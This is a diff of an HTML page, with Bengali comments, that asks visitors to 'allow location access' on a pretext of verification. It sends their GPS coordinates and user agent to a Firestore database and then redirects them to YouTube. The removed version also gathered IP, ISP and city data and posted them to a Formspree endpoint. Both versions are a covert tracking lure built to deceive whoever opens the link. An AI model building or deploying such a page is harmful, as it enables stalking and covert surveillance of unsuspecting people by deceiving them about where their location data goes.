@@ -1,23 +1,33 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Allow Location</title>
   <style>
     body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
     button { padding: 12px 24px; font-size: 16px; border-radius: 5px; border: none; background: #2196f3; color: white; cursor: pointer; }
-    #locationInfo { margin-top: 20px; font-size: 16px; }
-    a { display: block; margin-top: 10px; font-weight: bold; color: #2196f3; }
   </style>
-</head>
-<body>
-  <h2>📍 Please allow location access</h2>
-  <p>This helps us verify your location.</p>
-  <button onclick="startTracking()">Allow & Continue</button>
+  <!-- Firebase SDKs -->
+  <script type="module">
+    // Import Firebase modules
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-firestore.js";
 
-  <div id="locationInfo"></div> <!-- 🌍 Show lat/lon and map link -->
+    // Your Firebase config - এখানের তথ্য তোমার প্রজেক্ট থেকে নিয়ে আসবে
+    const firebaseConfig = {
+      apiKey: "YOUR_API_KEY",
+      authDomain: "YOUR_AUTH_DOMAIN",
+      projectId: "YOUR_PROJECT_ID",
+      storageBucket: "YOUR_STORAGE_BUCKET",
+      messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+      appId: "YOUR_APP_ID"
+    };
 
-  <script>
+    // Initialize Firebase app and Firestore
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // Function to get geolocation
     async function getGeoCoords() {
       return new Promise((resolve) => {
         if (!navigator.geolocation) {
@@ -39,64 +49,37 @@
       });
     }
 
+    // Function to send data to Firestore
     async function startTracking() {
       try {
-        // IP
-        const ipRes = await fetch('https://api64.ipify.org?format=json');
-        const ipJson = await ipRes.json();
-        const ip = ipJson.ip;
-
-        // Location via IP
-        const locRes = await fetch(`https://ipwhois.app/json/${ip}`);
-        const locData = await locRes.json();
-
-        // GPS
         const gps = await getGeoCoords();
 
-        // Final data
+        // Prepare data object
         const data = {
-          ip: ip,
-          isp: locData.org || 'N/A',
-          country: locData.country || 'N/A',
-          city: locData.city || 'N/A',
-          region: locData.region || 'N/A',
-          timezone: locData.timezone || 'N/A',
           latitude: gps.latitude,
           longitude: gps.longitude,
-          user_agent: navigator.userAgent
+          user_agent: navigator.userAgent,
+          timestamp: serverTimestamp()
         };
 
-        // ✅ Show Lat/Lon and Google Maps link
-        const infoDiv = document.getElementById("locationInfo");
-        if (!isNaN(gps.latitude) && !isNaN(gps.longitude)) {
-          const mapURL = `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`;
-          infoDiv.innerHTML = `
-            <div>
-              📌 <strong>Latitude:</strong> ${gps.latitude}<br>
-              📌 <strong>Longitude:</strong> ${gps.longitude}<br>
-              <a href="${mapURL}" target="_blank">🌐 Google Map এ লোকেশন দেখুন</a>
-            </div>
-          `;
-        } else {
-          infoDiv.innerHTML = `<span style="color:red;">লোকেশন অনুমতি পাওয়া যায়নি।</span>`;
-        }
-
-        // Send to Formspree
-        await fetch("https://formspree.io/f/mldnbqvo", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data)
-        });
+        // Save to Firestore collection "locations"
+        await addDoc(collection(db, "locations"), data);
 
       } catch (err) {
-        console.error("Tracking error:", err);
+        console.error("Error saving location:", err);
       } finally {
-        // Delay 3s before redirect (so user sees the map link)
-        setTimeout(() => {
-          window.location.href = "https://youtube.com";
-        }, 3000);
+        // Redirect to YouTube after
+        window.location.href = "https://youtube.com";
       }
     }
+
+    // Attach to window so can call from inline button onclick
+    window.startTracking = startTracking;
   </script>
+</head>
+<body>
+  <h2>📍 Please allow location access</h2>
+  <p>This helps us verify your location.</p>
+  <button onclick="startTracking()">Allow & Continue</button>
 </body>
 </html>
